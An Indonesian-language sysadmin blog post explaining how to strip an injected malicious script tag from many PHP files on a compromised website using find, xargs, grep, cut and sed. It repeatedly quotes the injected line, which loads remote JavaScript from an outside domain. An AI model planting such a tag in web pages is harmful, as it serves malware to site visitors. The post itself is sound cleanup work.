---
title: 'Menghapus Malicious Code Pada Halaman Web'
date: 2015-08-24T14:04:16+07:00
description: "Tip untuk menghapus malicious code pada halaman web menggunakan CLI"
tags: ['code', 'linux', unix', 'text', 'shell', 'sysadmin']
---
Salah satu masalah keamanan pada web adalah halaman web disusupi dengan malicious code. Dengan mengunjungi web yang disusupi malicious code, perangkat user dapat terjangkit malware ataupun masalah keamanan lainnya.

Contohnya pada hari ini saya mendapatkan masalah ada website yang terkena
*code injection* yang menambahkan script pada halaman-halaman website tersebut
sehingga diblock oleh Google. Setelah beberapa melakukan pencarian diperoleh
script yang ditambahkan pada source code PHP.

    <script language="JavaScript" 
    src="http://3xindiansex.com/st/css/js/jq-footer.js" 
    type="text/javascript"></script>

Script itu tersebar dibanyak file PHP web ini, untuk menghapusnya satu-satu akan
menghabiskan banyak waktu dan mungkin dapat merusak tampilan web apabila ada
bagian lain yang salah dihapus.

Untuk menghapus script tersebut ada beberapa tool yang digunakan. **find**
untuk mencari file yang akan diproses, **xargs** untuk menjalankan perintah
yang disubtitusi dengan hasil file yang diperoleh dengan perintah **find**,
**grep** untuk menyaring file yang berisikan script yang akan dihapus,
**cut** untuk memotong hasil output dari **grep** dan terakhir **sed** untuk
menghapus script pada file.

Semua tool tersebut akan dikaitkan dengan menggunakan *pipe*, salah satu
tool yang sangat berguna untuk pekerjaan pada *command line*

Pertama tampilkan file yang akan diproses:

    find -type f -print0

`-type f` untuk mencari object berjenis file (gunakan d untuk cari directory)

`-print0` tampilkan outputnya dalam bentuk *null terminated string* (kalau
hasil **find** ditampilkan satu file perbaris)

Kirimkan nama file ke perintah *grep* untuk menfilter file-file yang mengandung
script yang akan dihapus. Untuk melakukan ini kita akan *pipe* output **find**
ke *xargs* yang menjalankan perintah *grep*.

    find -type f -print0 | xargs -i -0 grep -H '<script language="JavaScript" 
    src="http://3xindiansex.com/st/css/js/jq-footer.js" 
    type="text/javascript"></script>' {}

`xargs -i -0` ganti {} dengan output dari output perintah sebelumnya.
-0 menandakan bahwa output sebelumnya merupakan *null terminated string*

dan

`grep -H ...` tampilkan string yang dicari beserta dengan nama file.

Contoh outputnya seperti ini:

    gallery.php: <script ... >

Nah kita cuma perlu nama filenya, gunakan **cut** untuk memotong output
dengan delimiter ":"

    find -type f -print0 | xargs -i -0 grep -H '<script language="JavaScript" 
    src="http://3xindiansex.com/st/css/js/jq-footer.js" 
    type="text/javascript"></script>' {} | cut -f 1 -d:

`-f 1` ambil field 1 dari hasil pemotongan
`-d:`  gunakan ":" sebagai delimiter antar field

Dan terakhir hapus script pada file-file tersebut dengan menggunakan **sed**.

    for i in `find -type f -print0 | xargs -i -0 grep -H 
    '<script language="JavaScript" 
    src="http://3xindiansex.com/st/css/js/jq-footer.js" 
    type="text/javascript"></script>' {} | cut -f 1 -d:`; do sed -i 
    's/<script language="JavaScript" 
    src="http:\/\/3xindiansex.com\/st\/css\/js\/jq-footer.js" 
    type="text\/javascript"><\/script>//g' $i; done

Nama file-file yang ditemukan dari perintah sebelumnya dikirim ke perintah
looping for yang nantinya akan diproses dengan **sed**.

`sed -i` untuk melakukan perubahan terhadap file *in-place* dan
`s/asli/baru/g` perintah **sed** untuk melakukan substitusi text asli menjadi text baru secara global (seluruh asli diganti menjadi baru).

Tool-tool kecil pada Linux/Unix seperti ini sangat membantu pekerjaan system
admin, terutama untuk system admin yang malas seperti saya ^^.

Happy hacking!
